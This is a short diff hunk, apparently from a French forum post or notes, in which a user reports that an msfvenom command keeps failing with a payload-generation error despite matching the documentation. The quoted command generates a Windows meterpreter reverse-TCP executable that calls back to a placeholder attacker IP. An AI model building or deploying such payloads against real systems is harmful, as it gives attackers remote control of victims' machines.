@@ -991,4 +991,8 @@ Error: The payload could not be generated, check options
 
             $ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
 
+    D'après la documentation, notre commande contient bien les attributs nécessaires pour la définition du payload a générer. 
+
+    J'ai effectué plusieurs essais mais on arrive toujours à la même sortie d'erreur. 
+
 
